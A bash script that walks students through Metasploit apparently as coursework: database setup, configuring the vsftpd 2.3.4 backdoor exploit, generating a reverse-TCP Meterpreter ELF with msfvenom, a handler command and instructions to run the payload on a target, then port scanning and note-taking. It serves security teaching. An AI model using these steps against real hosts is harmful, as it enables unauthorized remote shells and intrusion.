#!/bin/bash
################################################################################
# Metasploit Interactive Educational Workflow
# Holberton School - Cybersecurity Program
# Mode: 100% Interactive with Guided Learning
################################################################################

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
NOTES_FILE="$SCRIPT_DIR/notes.csv"
PAYLOAD_FILE="$SCRIPT_DIR/payload.elf"
DB_NAME="msf_database"
DB_USER="msf_user"

################################################################################
# Utility Functions
################################################################################

log() {
    echo -e "${GREEN}[âœ“]${NC} $*"
}

error() {
    echo -e "${RED}[âœ—]${NC} $*" >&2
}

warn() {
    echo -e "${YELLOW}[!]${NC} $*"
}

info() {
    echo -e "${BLUE}[i]${NC} $*"
}

explain() {
    echo -e "${CYAN}ğŸ’¡ WHY:${NC} $*"
}

ask() {
    echo -e "${YELLOW}â“${NC} $*"
}

pause_and_continue() {
    echo ""
    read -p "Press Enter to continue..."
    echo ""
}

ask_yes_no() {
    local prompt="$1"
    local default="${2:-y}"

    if [[ "$default" == "y" ]]; then
        read -p "$prompt [Y/n]: " response
        response=${response:-y}
    else
        read -p "$prompt [y/N]: " response
        response=${response:-n}
    fi

    [[ "$response" =~ ^[Yy]$ ]]
}

ask_input() {
    local prompt="$1"
    local default="$2"
    local value

    if [[ -n "$default" ]]; then
        read -p "$prompt [default: $default]: " value
        echo "${value:-$default}"
    else
        read -p "$prompt: " value
        echo "$value"
    fi
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root (use sudo)"
        exit 1
    fi
}

init_notes() {
    echo "Time,Host,Service,Port,Protocol,Type,Data" > "$NOTES_FILE"
}

add_note() {
    # Format: Time,Host,Service,Port,Protocol,Type,Data
    local host="${1:-N/A}"
    local service="${2:-N/A}"
    local port="${3:-N/A}"
    local protocol="${4:-N/A}"
    local type="${5:-info}"
    local data="${6:-}"
    echo "$(date '+%Y-%m-%d %H:%M:%S'),$host,$service,$port,$protocol,$type,\"$data\"" >> "$NOTES_FILE"
}

banner() {
    clear
    echo -e "${BLUE}"
    cat << 'EOF'
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘    METASPLOIT INTERACTIVE LEARNING WORKFLOW               â•‘
â•‘    Holberton Cybersecurity Program                        â•‘
â•‘    Mode: Guided & Educational                             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
EOF
    echo -e "${NC}"
}

################################################################################
# Part 1: PostgreSQL Setup
################################################################################

part1_setup_postgresql() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  PART 1: Setup Metasploit with PostgreSQL${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    explain "PostgreSQL is a powerful database that Metasploit uses to store:"
    echo "  â€¢ Scan results and discovered hosts"
    echo "  â€¢ Exploit attempts and sessions"
    echo "  â€¢ Credentials and loot collected"
    echo "  â€¢ Notes and documentation"
    echo ""
    explain "This makes Metasploit faster and allows you to track your work."
    echo ""

    if ! ask_yes_no "Ready to set up PostgreSQL with Metasploit?"; then
        warn "Skipping Part 1"
        return
    fi

    add_note "localhost" "postgresql" "5432" "tcp" "setup" "Beginning PostgreSQL database setup"

    # Install PostgreSQL
    echo ""
    info "Step 1: Installing PostgreSQL..."
    explain "We'll install PostgreSQL and its dependencies if not already present."

    if ! command -v psql &>/dev/null; then
        info "PostgreSQL not found. Installing..."
        apt-get update -qq && apt-get install -y postgresql postgresql-contrib
        log "PostgreSQL installed successfully"
        add_note "localhost" "postgresql" "5432" "tcp" "install" "PostgreSQL installed successfully"
    else
        log "PostgreSQL already installed"
    fi

    pause_and_continue

    # Start service
    echo ""
    info "Step 2: Starting PostgreSQL service..."
    explain "The PostgreSQL service must be running for Metasploit to connect."

    systemctl enable --now postgresql &>/dev/null
    log "PostgreSQL service started and enabled"
    add_note "localhost" "postgresql" "5432" "tcp" "service" "PostgreSQL service started and enabled"

    pause_and_continue

    # Create user and database
    echo ""
    info "Step 3: Creating PostgreSQL user and database..."
    ask "Database name to create?"
    DB_NAME=$(ask_input "Enter database name" "msf_database")

    ask "PostgreSQL user to create?"
    DB_USER=$(ask_input "Enter username" "msf_user")

    ask "Password for this user?"
    DB_PASS=$(ask_input "Enter password" "msf_pass_$(date +%s)")

    explain "Creating dedicated database user '$DB_USER' and database '$DB_NAME'."
    explain "This isolates Metasploit data from other PostgreSQL databases."

    sudo -u postgres psql -c "DROP DATABASE IF EXISTS $DB_NAME;" 2>/dev/null
    sudo -u postgres psql -c "DROP USER IF EXISTS $DB_USER;" 2>/dev/null
    sudo -u postgres psql -c "CREATE USER $DB_USER WITH PASSWORD '$DB_PASS';"
    sudo -u postgres psql -c "CREATE DATABASE $DB_NAME OWNER $DB_USER;"

    log "Database '$DB_NAME' created with user '$DB_USER'"
    add_note "localhost" "postgresql" "5432" "tcp" "database" "Created database $DB_NAME with user $DB_USER"

    pause_and_continue

    # Initialize Metasploit DB
    echo ""
    info "Step 4: Initializing Metasploit database..."
    explain "This connects Metasploit to PostgreSQL and creates necessary tables."

    msfdb reinit
    log "Metasploit database initialized"
    add_note "localhost" "metasploit" "5432" "tcp" "init" "Metasploit database initialized with msfdb"

    pause_and_continue

    # Verify
    echo ""
    info "Step 5: Verifying database connection..."
    explain "Let's check if Metasploit can connect to PostgreSQL."

    echo ""
    info "Running: msfconsole -q -x 'db_status; exit'"
    msfconsole -q -x "db_status; exit"

    echo ""
    log "âœ“ Part 1 completed! PostgreSQL is configured and connected."
    add_note "localhost" "postgresql" "5432" "tcp" "complete" "Part 1 - PostgreSQL setup completed successfully"

    pause_and_continue
}

################################################################################
# Part 2: Basic Metasploit Usage
################################################################################

part2_basic_usage() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  PART 2: Basic Usage of Metasploit${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    explain "In this part, you'll learn the fundamental Metasploit workflow:"
    echo "  1. Search for exploits"
    echo "  2. Select an exploit"
    echo "  3. Configure options (RHOSTS, LHOST, LPORT)"
    echo "  4. Choose a payload"
    echo "  5. Understand how to execute (we won't actually exploit)"
    echo ""

    if ! ask_yes_no "Ready to explore basic Metasploit commands?"; then
        warn "Skipping Part 2"
        return
    fi

    # Ask for target
    echo ""
    ask "What target IP should we configure for demonstration?"
    TARGET_RHOSTS=$(ask_input "Enter target IP" "192.168.1.100")

    ask "What is YOUR IP (LHOST - where you receive connections)?"
    TARGET_LHOST=$(ask_input "Enter your IP" "$(hostname -I | awk '{print $1}')")

    ask "What port should listen on (LPORT)?"
    TARGET_LPORT=$(ask_input "Enter port" "4444")

    echo ""
    info "Configuration:"
    echo "  RHOSTS (target): $TARGET_RHOSTS"
    echo "  LHOST (your IP): $TARGET_LHOST"
    echo "  LPORT (your port): $TARGET_LPORT"
    echo ""

    explain "RHOSTS = Remote host (target to attack)"
    explain "LHOST = Local host (your IP to receive connection)"
    explain "LPORT = Local port (port where you listen)"

    add_note "$TARGET_RHOSTS" "vsftpd" "21" "tcp" "exploit_config" "Configured vsftpd_234_backdoor - LHOST=$TARGET_LHOST LPORT=$TARGET_LPORT"

    pause_and_continue

    # Execute Metasploit commands inline
    echo ""
    info "Executing Metasploit commands..."
    explain "We'll search for exploits, configure options, and show the workflow."

    msfconsole -q -x "
db_status;
echo '[*] Searching for vsftpd exploits...';
search type:exploit name:vsftpd;
echo '[*] Selecting the vsftpd 2.3.4 backdoor exploit...';
use exploit/unix/ftp/vsftpd_234_backdoor;
echo '[*] Showing exploit options...';
show options;
echo '[*] Setting target IP (RHOSTS)...';
set RHOSTS $TARGET_RHOSTS;
echo '[*] Showing available payloads...';
show payloads;
echo '[*] Setting payload...';
set PAYLOAD cmd/unix/interact;
echo '[*] Setting LHOST and LPORT...';
set LHOST $TARGET_LHOST;
set LPORT $TARGET_LPORT;
echo '[*] Showing final configuration...';
show options;
notes -a -t exploit_demo -n 'Configured vsftpd exploit with RHOSTS=$TARGET_RHOSTS LHOST=$TARGET_LHOST LPORT=$TARGET_LPORT' $TARGET_RHOSTS;
echo '';
echo '[!] NOTE: We are NOT running exploit command.';
echo '[!] To actually exploit, you would run: exploit or run';
echo '[!] This is for educational demonstration only.';
exit
"

    echo ""
    log "âœ“ Part 2 completed! You've learned the basic Metasploit workflow."
    add_note "$TARGET_RHOSTS" "metasploit" "N/A" "N/A" "complete" "Part 2 - Basic usage demonstration completed"

    pause_and_continue
}

################################################################################
# Part 3: Create and Use a Simple Payload
################################################################################

part3_create_payload() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  PART 3: Create and Use a Simple Payload${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    explain "Payloads are code that runs on the target after exploitation."
    explain "msfvenom is a tool to generate standalone payloads."
    echo ""
    echo "  Types of payloads:"
    echo "  â€¢ Reverse TCP: Target connects back to you"
    echo "  â€¢ Bind TCP: You connect to target"
    echo "  â€¢ Meterpreter: Advanced shell with many features"
    echo ""

    if ! ask_yes_no "Ready to create a payload?"; then
        warn "Skipping Part 3"
        return
    fi

    # Note will be added after configuration

    # Get parameters
    echo ""
    ask "Payload type:"
    echo "  1) linux/x86/meterpreter/reverse_tcp (Recommended)"
    echo "  2) linux/x64/shell/reverse_tcp"
    PAYLOAD_CHOICE=$(ask_input "Choose payload [1-2]" "1")

    case "$PAYLOAD_CHOICE" in
        2) PAYLOAD_TYPE="linux/x64/shell/reverse_tcp" ;;
        *) PAYLOAD_TYPE="linux/x86/meterpreter/reverse_tcp" ;;
    esac

    echo ""
    ask "What is YOUR IP (LHOST) to receive the connection?"
    PAYLOAD_LHOST=$(ask_input "Enter your IP" "$(hostname -I | awk '{print $1}')")

    ask "What port (LPORT) should listen on?"
    PAYLOAD_LPORT=$(ask_input "Enter port" "4444")

    echo ""
    info "Payload Configuration:"
    echo "  Type: $PAYLOAD_TYPE"
    echo "  LHOST: $PAYLOAD_LHOST"
    echo "  LPORT: $PAYLOAD_LPORT"
    echo "  Format: ELF (Linux executable)"
    echo "  Output: $PAYLOAD_FILE"
    echo ""

    explain "This creates a Linux executable that connects back to you."
    explain "When executed on target, it opens a reverse shell to your IP:PORT."

    if ! ask_yes_no "Generate this payload?"; then
        warn "Payload generation cancelled"
        return
    fi

    echo ""
    info "Generating payload with msfvenom..."
    echo "Command: msfvenom -p $PAYLOAD_TYPE LHOST=$PAYLOAD_LHOST LPORT=$PAYLOAD_LPORT -f elf -o $PAYLOAD_FILE"
    echo ""

    msfvenom -p "$PAYLOAD_TYPE" \
        LHOST="$PAYLOAD_LHOST" \
        LPORT="$PAYLOAD_LPORT" \
        -f elf \
        -o "$PAYLOAD_FILE"

    if [[ -f "$PAYLOAD_FILE" ]]; then
        chmod +x "$PAYLOAD_FILE"
        local size=$(stat -c%s "$PAYLOAD_FILE")
        log "âœ“ Payload created: $PAYLOAD_FILE ($size bytes)"

        echo ""
        info "Payload information:"
        file "$PAYLOAD_FILE"
        ls -lh "$PAYLOAD_FILE"

        add_note "$PAYLOAD_LHOST" "meterpreter" "$PAYLOAD_LPORT" "tcp" "payload" "Generated $PAYLOAD_TYPE - $size bytes"

        echo ""
        warn "âš ï¸  IMPORTANT: How to use this payload"
        echo ""
        echo "1. Set up a listener (on attacker machine):"
        echo "   msfconsole -q -x \"use exploit/multi/handler; set payload $PAYLOAD_TYPE; set LHOST $PAYLOAD_LHOST; set LPORT $PAYLOAD_LPORT; exploit\""
        echo ""
        echo "2. Transfer payload.elf to target system"
        echo ""
        echo "3. Execute on target (ONLY in authorized testing):"
        echo "   chmod +x payload.elf && ./payload.elf"
        echo ""

    else
        error "Payload generation failed"
        add_note "$PAYLOAD_LHOST" "meterpreter" "$PAYLOAD_LPORT" "tcp" "error" "Failed to create payload"
        return 1
    fi

    log "âœ“ Part 3 completed! Payload generated successfully."
    add_note "$PAYLOAD_LHOST" "meterpreter" "$PAYLOAD_LPORT" "tcp" "complete" "Part 3 - Payload generation completed"

    pause_and_continue
}

################################################################################
# Part 4: Explore Auxiliary Modules
################################################################################

part4_auxiliary_scan() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  PART 4: Explore Auxiliary Modules (Port Scanning)${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    explain "Auxiliary modules perform tasks OTHER than exploitation:"
    echo "  â€¢ Port scanning"
    echo "  â€¢ Service enumeration"
    echo "  â€¢ Password cracking"
    echo "  â€¢ Fuzzing"
    echo "  â€¢ Denial of service testing"
    echo ""
    explain "We'll use a TCP port scanner to find open ports."
    echo ""

    if ! ask_yes_no "Ready to perform a port scan?"; then
        warn "Skipping Part 4"
        return
    fi

    # Get scan parameters
    echo ""
    ask "What target IP/range should we scan?"
    SCAN_TARGET=$(ask_input "Enter IP or range" "127.0.0.1")

    ask "Which ports to scan? (comma-separated)"
    SCAN_PORTS=$(ask_input "Enter ports" "21,22,23,25,80,443,3306,8080")

    ask "How many threads to use?"
    SCAN_THREADS=$(ask_input "Enter threads" "10")

    echo ""
    info "Scan Configuration:"
    echo "  Target (RHOSTS): $SCAN_TARGET"
    echo "  Ports: $SCAN_PORTS"
    echo "  Threads: $SCAN_THREADS"
    echo ""

    explain "More threads = faster scan, but may be detected easier."
    explain "Scanning localhost (127.0.0.1) is safe for testing."

    if ! ask_yes_no "Start the scan?"; then
        warn "Scan cancelled"
        return
    fi

    # Add note for scan configuration
    add_note "$SCAN_TARGET" "portscan" "$SCAN_PORTS" "tcp" "scan_config" "TCP port scan configured - Threads: $SCAN_THREADS"

    # Execute port scan inline
    echo ""
    info "Executing port scan..."

    msfconsole -q -x "
use auxiliary/scanner/portscan/tcp;
set RHOSTS $SCAN_TARGET;
set PORTS $SCAN_PORTS;
set THREADS $SCAN_THREADS;
echo '[*] Starting TCP port scan...';
echo '[*] Target: $SCAN_TARGET';
echo '[*] Ports: $SCAN_PORTS';
run;
notes -a -t portscan -n 'Scanned $SCAN_TARGET ports $SCAN_PORTS' $SCAN_TARGET;
echo '[*] Scan complete!';
exit
"

    echo ""
    log "âœ“ Part 4 completed! Port scan finished."
    add_note "$SCAN_TARGET" "portscan" "$SCAN_PORTS" "tcp" "complete" "Part 4 - TCP port scan completed"

    pause_and_continue
}

################################################################################
# Part 5: Documentation & Reporting
################################################################################

part5_documentation() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  PART 5: Documentation and Reporting${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    explain "Documentation is CRITICAL in penetration testing:"
    echo "  â€¢ Tracks what you did"
    echo "  â€¢ Records findings"
    echo "  â€¢ Creates reports for clients"
    echo "  â€¢ Provides evidence"
    echo ""
    explain "Metasploit has built-in commands for documentation:"
    echo "  â€¢ notes: Store text notes about hosts"
    echo "  â€¢ loot: Store files/data collected"
    echo ""

    if ! ask_yes_no "Ready to document findings?"; then
        warn "Skipping Part 5"
        return
    fi

    # Get host for notes
    echo ""
    ask "Which host/IP should we document?"
    DOC_HOST=$(ask_input "Enter host IP" "127.0.0.1")

    echo ""
    info "Adding notes to Metasploit database..."
    explain "We'll document all 5 parts we completed."

    # Execute documentation commands inline
    msfconsole -q -x "
notes -a -t project -n 'Completed all 5 parts of Metasploit workflow' $DOC_HOST;
notes -a -t part1 -n 'PostgreSQL configured for Metasploit' $DOC_HOST;
notes -a -t part2 -n 'Demonstrated exploit search and configuration' $DOC_HOST;
notes -a -t part3 -n 'Generated reverse TCP Meterpreter payload' $DOC_HOST;
notes -a -t part4 -n 'Performed TCP port scanning' $DOC_HOST;
notes -a -t part5 -n 'Documented findings using notes and loot' $DOC_HOST;
echo '';
echo '[*] All notes added. Displaying notes list...';
notes -l;
echo '';
echo '[*] Displaying loot...';
loot;
echo '';
echo '[*] Exporting loot to CSV format...';
loot -t csv;
exit
"

    echo ""
    info "Exporting notes to CSV file..."
    # Notes.csv already populated via add_note function

    if [[ -f "$NOTES_FILE" ]]; then
        log "Notes exported to: $NOTES_FILE"
        echo ""
        info "Preview of notes.csv:"
        head -10 "$NOTES_FILE" | column -t -s ','
    fi

    echo ""
    log "âœ“ Part 5 completed! Documentation and reporting finished."
    add_note "$DOC_HOST" "documentation" "N/A" "N/A" "complete" "Part 5 - All findings documented"
    add_note "$DOC_HOST" "summary" "N/A" "N/A" "summary" "Metasploit workflow completed - 5 parts executed successfully"

    pause_and_continue
}

################################################################################
# Summary Function
################################################################################

show_summary() {
    banner
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${GREEN}  ğŸ‰ WORKFLOW COMPLETED! ğŸ‰${NC}"
    echo -e "${GREEN}â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo ""

    info "You have completed all 5 parts of the Metasploit workflow:"
    echo ""
    echo "  âœ“ Part 1: PostgreSQL Setup"
    echo "  âœ“ Part 2: Basic Metasploit Usage"
    echo "  âœ“ Part 3: Payload Generation"
    echo "  âœ“ Part 4: Auxiliary Modules (Port Scanning)"
    echo "  âœ“ Part 5: Documentation & Reporting"
    echo ""

    info "Generated Files:"
    [[ -f "$NOTES_FILE" ]] && echo "  â€¢ $NOTES_FILE ($(wc -l < "$NOTES_FILE") lines)"
    [[ -f "$PAYLOAD_FILE" ]] && echo "  â€¢ $PAYLOAD_FILE ($(stat -c%s "$PAYLOAD_FILE") bytes)"
    echo ""

    info "What you learned:"
    echo "  â€¢ Setting up Metasploit with PostgreSQL"
    echo "  â€¢ Searching and configuring exploits"
    echo "  â€¢ Creating payloads with msfvenom"
    echo "  â€¢ Using auxiliary modules for reconnaissance"
    echo "  â€¢ Documenting findings professionally"
    echo ""

    warn "âš ï¸  Remember:"
    echo "  â€¢ Only use these skills in authorized environments"
    echo "  â€¢ Always get written permission before testing"
    echo "  â€¢ Unauthorized access is illegal"
    echo ""

    log "Thank you for using the Metasploit Interactive Workflow!"
}

################################################################################
# Main Function
################################################################################

main() {
    banner

    echo "Welcome to the Metasploit Interactive Learning Workflow!"
    echo ""
    info "This script will guide you through:"
    echo "  â€¢ Setting up Metasploit with PostgreSQL"
    echo "  â€¢ Basic exploitation workflow"
    echo "  â€¢ Creating payloads"
    echo "  â€¢ Port scanning with auxiliary modules"
    echo "  â€¢ Documentation and reporting"
    echo ""
    warn "You will be prompted at each step with explanations."
    warn "This is 100% educational and interactive."
    echo ""

    if ! ask_yes_no "Are you ready to begin?"; then
        echo "Goodbye!"
        exit 0
    fi

    # Check prerequisites
    check_root

    if ! command -v msfconsole &>/dev/null; then
        error "Metasploit is not installed. Please install it first."
        exit 1
    fi

    # Initialize
    init_notes

    # Run all parts
    part1_setup_postgresql
    part2_basic_usage
    part3_create_payload
    part4_auxiliary_scan
    part5_documentation

    # Summary
    show_summary
}

# Execute
main "$@"
